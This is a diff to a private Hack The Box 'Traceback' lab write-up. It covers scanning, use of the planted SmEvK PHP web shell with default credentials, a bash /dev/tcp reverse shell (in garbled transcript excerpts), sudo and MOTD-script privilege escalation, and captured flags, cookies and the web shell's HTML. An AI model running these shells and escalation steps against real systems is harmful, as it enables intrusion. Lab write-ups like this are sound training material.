@@ -73,9 +73,8 @@ The source loot and transcript were read from:
 | SmEvK login response | `loot/smevk-login.html` |
 | Session cookie | `loot/smevk.cookies` |
 | Flags | `loot/flags.txt` |
-| Source screenshots | `screenshots/1...11*.png` |
 
-The screenshots used below were copied into the vault as `traceback-*.png` so the placeholders render in Obsidian. The flag values remain in the private source loot and are intentionally not repeated in this shared note.
+The scan, shell, and privilege evidence are retained with the private source loot. The flag values are reproduced in the private flag section below.
 
 ## Variables
 
@@ -119,7 +118,7 @@ sudo nmap -Pn -n -sS -p- --min-rate 5000 \
 
 `-p-` checks all TCP ports. `-Pn` avoids relying on ICMP, and `-n` removes DNS delay. The retry and timeout values make this a fast first pass; a suspicious or empty result should be confirmed with a slower scan.
 
-![[traceback-1-nmap-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
 > 📸 Screenshot: Full TCP scan with TCP/22 and TCP/80 visible.
 
 ## 3. Service and version scan
@@ -138,7 +137,7 @@ Observed results:
 80/tcp open  http Apache httpd 2.4.29 (Ubuntu)
 ```
 
-![[traceback-2-nmap-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)
 > 📸 Screenshot: Service scan showing SSH and Apache versions.
 
 > [!abstract] 🧠 Why
@@ -167,7 +166,7 @@ The meaningful clue was:
 <!--Some of the best web shells that you might need ;)-->
 ```
 
-![[traceback-3-http-enum.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/3.http-enum.png>)
 > 📸 Screenshot: Homepage source with the attacker clue highlighted.
 
 > [!hint] 💡 Hint
@@ -218,7 +217,7 @@ The result was:
 smevk.php (Status: 200) [Size: 1261]
 ```
 
-![[traceback-4-gobuster-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/4.gobuster-shell.png>)
 > 📸 Screenshot: Targeted Gobuster result identifying `smevk.php`.
 
 > [!tip] ⚡ More efficient path
@@ -242,7 +241,7 @@ curl -i "http://$BoxIP:$WebPort/smevk.php" \
   -o "$BoxDir/loot/smevk-login-form.html"
 ```
 
-![[traceback-5-login-form.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/5.login-form.png>)
 > 📸 Screenshot: SmEvK login form with the POST field names visible.
 
 SmEvK is a known PHP web shell. Its default credentials are `admin:admin`; test them once and preserve the session cookie.
@@ -267,7 +266,7 @@ Useful: php, perl, tar, gzip, bzip2, nc, locate
 Downloaders: wget
 ```
 
-![[traceback-6-webapp-smevk.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/6.webapp-smevk.png>)
 > 📸 Screenshot: Authenticated SmEvK console and its disclosed execution identity.
 
 > [!warning] 💡 Common mistake
@@ -299,7 +298,7 @@ curl -sS -b "$BoxDir/loot/smevk.cookies" \
 
 The callback landed as `webadmin` on `traceback`.
 
-![[traceback-7-stable-shell-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/7.stable-shell-proof.png>)
 > 📸 Screenshot: Stable shell showing `id`, `whoami`, `hostname`, and `uname -a`.
 
 Upgrade the raw netcat connection to a PTY:
@@ -357,7 +356,7 @@ The important local relationship was that `webadmin` could use one exact sudo ru
 (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
 
-![[traceback-8-sudo-l.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/8.sudo-l.png>)
 > 📸 Screenshot: `sudo -l` showing the passwordless Luvit rule.
 
 > [!abstract] 🧠 Why
@@ -413,7 +412,7 @@ The critical permissions were:
 
 `00-header` is executed during the SSH login process. Because it is writable through the `sysadmin` group, code appended to it will run in the privileged context used to generate the MOTD.
 
-![[traceback-10-motd-permissions.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/10.motd-permissions.png>)
 > 📸 Screenshot: `/etc/update-motd.d/` showing `root sysadmin` ownership and group write permission.
 
 > [!abstract] 🧠 Why
@@ -479,10 +478,10 @@ root
 
 The `-p` option tells Bash to preserve its effective UID. Without `-p`, Bash may drop the SUID privilege when launched by a non-root real UID.
 
-![[traceback-9-ssh-webadmin.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/9.ssh-webadmin.png>)
 > 📸 Screenshot: Successful SSH reconnect as `webadmin`, showing the fresh MOTD execution trigger.
 
-![[traceback-11-rootbash.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/11.rootbash.png>)
 > 📸 Screenshot: `/tmp/rootbash` with SUID root permissions and `euid=0(root)` proof.
 
 > [!hint] 💡 Why the fresh connection matters
@@ -498,15 +497,29 @@ Once `euid=0` was confirmed, the transcript read the user flag from `sysadmin`'s
 ```bash
 /tmp/rootbash -p -c 'cat /home/sysadmin/user.txt'
 /tmp/rootbash -p -c 'cat /root/root.txt'
-loot flag user "$UserFlag"
-loot flag root "$RootFlag"
+loot flag user "6483d0db98270fe39ae6ac640419d7ae"
+loot flag root "416c4745f987bf543c3786e6fa8c639c"
 ```
 
-The source values are retained in:
+The source values are also reproduced in the private Flags section below. The original source values are retained in:
 
 `/home/kali/Platforms/HackTheBox/Traceback/loot/flags.txt`
 
 > 📸 Screenshot placeholder: Recreate one proof frame containing `id`, `whoami`, `hostname`, and `/root/root.txt`. The supplied source contains root identity/SUID evidence and the private flag record, but no dedicated combined root-flag screenshot.
+
+
+
+### Captured flag values from source loot
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: 6483d0db98270fe39ae6ac640419d7ae
+root: 416c4745f987bf543c3786e6fa8c639c
+```
 
 ## 14. Clean down
 
@@ -573,6 +586,251 @@ boxdone
 | SmEvK | `admin:admin` | HTTP `/smevk.php` | Default web-shell credentials |
 | `webadmin` | Key-based SSH access observed | SSH/22 | Exact key-placement command was not captured in the transcript |
 
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Traceback"
+export BoxIP="10.129.1.78"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Traceback"
+export Domain=""
+export DCip=""
+export Username=webadmin
+export Password=""
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export Lport="4444"
+export TransferPort="8000"
+export WebPort=80
+export OpenPorts=""
+export Product=""
+export Version=""
+export ExploitId=""
+export ExploitFile=""
+export ExploitName=""
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/smevk.cookies`
+
+```text
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+10.129.1.78	FALSE	/	FALSE	0	PHPSESSID	j91gt98vjigruvtlfn2p875ivb
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+.htpasswd            (Status: 403) [Size: 295]
+.htpasswd.php        (Status: 403) [Size: 299]
+.htpasswd.html       (Status: 403) [Size: 300]
+.htpasswd.txt        (Status: 403) [Size: 299]
+Set-Cookie: PHPSESSID=sces6jchgt8s8pekd2q7hn22vr; path=/
+$ [16:19:37] curl -sS -c loot/smevk.cookies -b loot/smevk.cookies \
+        Password :  <input type="password" name="pass" ><br>
+kali@kali:~/Platforms/HackTheBox/Traceback [16:17:39] $ =curl -sS -c loot/smevk.cookies -b loot/smevk.cookies \
+$ [16:27:19] curl -sS -b loot/smevk.cookies \
+kali@kali:~/Platforms/HackTheBox/Traceback [16:23:42] $ curl -sS -b loot/smevk.cookies \
+  "http://$BoxIP/smevk.php" &curlloot/smevk.cookies'a=Console''c=/var/www/html/'"p1=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"'p2=''p3=''charset=UTF-8'"http://$BoxIP/smevk.php"r o P $ $ 4 0>&1'" \4 0>&1'" \4 0>&1'" \4 0>&1'" \>
+webadmin@traceback:/var/www/html$ cat /etc/passwd | grep -v nologin | grep -v fal
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+$ [16:35:21] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP
+kali@kali:~/Platforms/HackTheBox/Traceback [16:34:21] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIPssh~/.ssh/id_rsa>
+$ [16:39:14] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
+$ [16:40:25] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
+$ [16:42:22] loot flag user 6483d0db98270fe39ae6ac640419d7ae
+kali@kali:~/Platforms/HackTheBox/Traceback [16:39:12] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'ssh~/.ssh/id_rsa'true'>
+kali@kali:~/Platforms/HackTheBox/Traceback [16:39:32] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'ssh~/.ssh/id_rsa'true'>
+[+] Flag saved:  user = 6483d0db98270fe39ae6ac640419d7ae  →  loot/flags.txt
+]0;webadmin@traceback: ~webadmin@traceback:~$ ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
+Warning: Identity file /home/webadmin/.ssh/id_rsa not accessible: No such file or directory.
+$ [16:43:57] loot flag root 416c4745f987bf543c3786e6fa8c639c
+```
+
+### Additional captured source values
+
+#### `loot/smevk-login.html`
+
+```text
+<html><head><link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,100' rel='stylesheet' type='text/css'></head><html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>SmEvK v3</title>
+<style>
+        body {background-color:black;color:#fff;}
+        body,td,th    { font-family: Josefin Sans, sans-serif;font-size:13px;margin:0;vertical-align:top; }
+        span,h1,a    { color:#8B008B !important; }
+        span        { font-weight: bolder; }
+        h1            { padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
+        div.content    { padding: 0px;margin:0 0px;background: #0F1010;border:1px solid #8B008B; border-radius:5px;}
+        a            { text-decoration:none;   }
+        a:hover        { border-bottom:0px solid #5e5e5e;text-decoration:none; }
+        a:hover{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/pakistan.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/PAKISTAN.gif"), auto;text-decoration:none;}
+        .ml1        { border:1px solid #8B008B;padding:px;margin:0;overflow: auto; }
+        .bigarea    { width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:#8B008B; background:#2F2F2F;}
+        input, textarea, select    { margin-top:0;color:#63E1FF;background-color:black;border-radius:5px;border:1px solid #8B008B; border-radis:5px;font: 10pt arial,"Courier New"; }
+        input[type="button"]:hover,input[type="submit"]:hover {background-color:#094F60;color:black;text-decoration:none;}
+        form        { margin:0px; background:#0F1010;}
+        #toolsTbl    { text-align:center; }
+        .toolsInp    { width: 80%; background:black; border-radius:5px; border-color:#8B008B; }
+        .main th    {text-align:left;background-color:#0E5061;}
+        .main tr:hover{background:#8B008B; border:5px solid;border-color:#8B008B;}
+        .main td, th{vertical-align:middle;}
+        .menu { height:30px; border-radius:10px;}
+        .menu th{padding:1px;border-radius: 5px;  background:#0E5061;     -webkit-transform: rotate(20deg);
+    -moz-transform: rotate(20deg);
+    -o-transform: rotate(20deg);
+    -ms-transform: rotate(20deg);
+    transform: rotate(20deg);}
+        .menu th:hover{background:#0F1010;text-decoration: none;}
+                pre {font-family: Josefin Sans, sans-serif;color:#FFFFFF;}
+        #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
+
+
+        .cpr {margin-bottom:5px;font-weight:bold; }
+        .cpb {width:34px;margin:0 5px;}
+
+        .npoad td {padding:0;}
+        #Smevktools{
+        margin-top:50px;
+        width:500px;
+        border:1px solid;
+        border-radius:10px;
+    }
+    .smevklogo td{
+        font-size:12px;
+        font-weight:bold;
+
+
+
+    }
+    .smevklogo{
+        margin-left:5px;
+        background:url(/bg.jpg);
+        background-repeat: no-repeat;
+       background-position: CENTER;
+        background-color:#0F1010;
+        background-size: 400px 120px;
+
+
+
+    }
+    </style>
+
+</html>
+<style type="text/css">body, a:hover {text-decoration:none;cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
+    <script>
+        function set(a,c,p1,p2,p3,charset) {
+            if(a != null)document.mf.a.value=a;
+            if(c != null)document.mf.c.value=c;
+            if(p1 != null)document.mf.p1.value=p1;
+            if(p2 != null)document.mf.p2.value=p2;
+            if(p3 != null)document.mf.p3.value=p3;
+            if(charset != null)document.mf.charset.value=charset;
+        }
+        function g(a,c,p1,p2,p3,charset) {
+            set(a,c,p1,p2,p3,charset);
+            document.mf.submit();
+        }
+        function a(a,c,p1,p2,p3,charset) {
+            set(a,c,p1,p2,p3,charset);
+            var params = "ajax=true";
+            for(i=0;i<document.mf.elements.length;i++)
+                params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
+            sr("/smevk.php", params);
+        }
+        function sr(url, params) {
+            if (window.XMLHttpRequest) {
+                req = new XMLHttpRequest();
+                req.onreadystatechange = processReqChange;
+                req.open("POST", url, true);
+                req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
+                req.send(params);
+            }
+            else if (window.ActiveXObject) {
+                req = new ActiveXObject("Microsoft.XMLHTTP");
+                if (req) {
+                    req.onreadystatechange = processReqChange;
+                    req.open("POST", url, true);
+                    req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
+                    req.send(params);
+                }
+            }
+        }
+        function processReqChange() {
+            if( (req.readyState == 4) )
+                if(req.status == 200) {
+                    //alert(req.responseText);
+                    var reg = new RegExp("(\d+)([\S\s]*)", "m");
+                    var arr=reg.exec(req.responseText);
+                    eval(arr[2].substr(0, arr[1]));
+                }
+                else alert("Request error!");
+        }
+    </script>
+    <head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:black;"><div class="content" style="border:1px solid #8B008B; border-radius:5px;">
+    <form method=post name=mf style="display:none;">
+        <input type=hidden name=a value="FilesMan">
+        <input type=hidden name=c value="/var/www/html/">
+        <input type=hidden name=p1 value="">
+        <input type=hidden name=p2 value="">
+        <input type=hidden name=p3 value="">
+        <input type=hidden name=charset value="UTF-8">
+    </form><div class="smevklogo"><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
+          <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr>Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64</nobr></td></tr>
+          <tr><td><span>User</span></td><td>: 1000 ( webadmin ) <span>Group: </span> 1000 ( webadmin )</td></tr><tr><td><span>Server</span></td><td>: Apache/2.4.29 (Ubuntu)</td></tr><tr><td><span>Useful</span></td><td>: php, perl, tar, gzip, bzip2, nc, locate</td></tr><tr><td><span>Downloaders</span></td><td>: wget</td></tr><tr><td><span>D/functions</span></td><td>: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</td></tr><tr><td><span>Cwd</span></td><td>: <a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a> <font color=#00BB00><b>drwxr-xr-x</b></font> <a href=# onclick="g('FilesMan','/var/www/html','','','')">[ home ]</a></td></tr></table></td><td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td><td><nobr>: 10.129.1.78<br>: 10.10.14.7<br />: 8.25 GB<br />: 5.57 GB (67%)<br>: 7.2.19-0ubuntu0.18.04.2 <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a><br />: <font color=#8B008B<b>OFF</b></font><br />: 1</nobr></td></tr></table></div></div></div><div style="margin:5;background:black;"><div class="content" style="border-top:5px solid 430303;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr><th><a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a></th><th><a href="#" onclick="g('FilesMan',null,'','','')">Files</a></th><th><a href="#" onclick="g('Console',null,'','','')">Console</a></th><th><a href="#" onclick="g('SafeMode',null,'','','')">Bypasser</a></th><th><a href="#" onclick="g('Bypass',null,'','','')">Safe Mode</a></th><th><a href="#" onclick="g('StringTools',null,'','','')">String tools</a></th><th><a href="#" onclick="g('ImportScripts',null,'','','')">Import Scripts</a></th><th><a href="#" onclick="g('Network',null,'','','')">Network</a></th><th><a href="#" onclick="g('Readable',null,'','','')">Readable Dirs</a></th><th><a href="#" onclick="g('Deface',null,'','','')">Defacer</a></th><th><a href="#" onclick="g('Injector',null,'','','')">Code Injector</a></th><th><a href="#" onclick="g('Domain',null,'','','')">Domains</a></th><th><a href="#" onclick="g('Logout',null,'','','')">Logout</a></th></tr></table></div></div><div style="margin:5;background:black;"><h1>File manager</h1><div class=content><script>
+        function sa() {
+            for(i=0;i<document.files.elements.length;i++)
+            if(document.files.elements[i].type == 'checkbox')
+                document.files.elements[i].checked = document.files.elements[0].checked;
+        }
+        </script>
+        <table width='100%' class='main' cellspacing='0' cellpadding='2'>
+        <form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/..');"><b>[ .. ]</b></a></td><td>dir</td><td>2021-04-22 06:08:27</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="bg.jpg" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'bg.jpg', 'view')">bg.jpg</a></td><td>528.97 KB</td><td>2019-07-31 04:50:58</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'bg.jpg','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'bg.jpg', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'bg.jpg', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="index.html" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'index.html', 'view')">index.html</a></td><td>1.09 KB</td><td>2019-08-27 04:29:44</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'index.html','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'index.html', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="smevk.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'smevk.php', 'view')">smevk.php</a></td><td>102.62 KB</td><td>2020-02-27 05:37:01</td><td>root/webadmin</td><td><a href=# onclick="g('FilesTools',null,'smevk.php','chmod')"><font color=white><b>-r--r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'smevk.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'smevk.php', 'download')">D</a></td></tr><tr><td colspan=5>
+    <input type=hidden name=a value='FilesMan'>
+    <input type=hidden name=c value="/var/www/html/">
+    <input type=hidden name=charset value="UTF-8">
+    <select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option></select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="index.php" size="10"/>&nbsp;<input type="button" onclick="g('FilesMan','/var/www/html/','deface',document.getElementById('def').value)" value="Add your Deface"></td></tr>
+    </form></table></div></div><div style="margin:5px;background:black;"><div class="content" style="border:1px solid ; border-radius:5px;">
+<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
+    <tr>
+        <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="/var/www/html/"><input type=submit value=">>"></form></td>
+        <td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
+    </tr>
+    <tr>
+        <td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
+        <td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
+    </tr>
+    <tr>
+        <td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
+        <td><form method="post" ENCTYPE="multipart/form-data">
+        <input type=hidden name=a value="FilesMAn">
+        <input type=hidden name=c value="/var/www/html/">
+        <input type=hidden name=p1 value="uploadFile">
+        <input type=hidden name=charset value="UTF-8">
+        <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
+    </tr>
+</table></div></div>
+<div style="margin:5px;background:black;"><div class="content" style="border:2px solid ;text-align:center;font-weight:bold; border-radius:10px;margin:auto; width:500;">SmEvK_PaThAn Shell v3 coded by <a href="https://www.facebook.com/smevkpathan"> Kashif Khan</a></div></div>
+</div>
+</body></html>
+```
+
 ## Remediation recommendations
 
 | Finding | Recommendation |
@@ -595,7 +853,7 @@ boxdone
 - Cleanup and `boxdone`: [[RUNBOOK V2/Linux - Clean Down]]
 - Related theory: [[OSCP/MODULES/09. Common Web Application Attacks|Module 9 — Common Web Application Attacks]] and [[OSCP/MODULES/18. Linux Privilege Escalation|Module 18 — Linux Privilege Escalation]]
 
-### External resources
+## External resources
 
 - [HackTricks — Linux privilege escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
 - [GTFOBins](https://gtfobins.github.io/) — sudo, interpreters, pagers, and SUID escapes
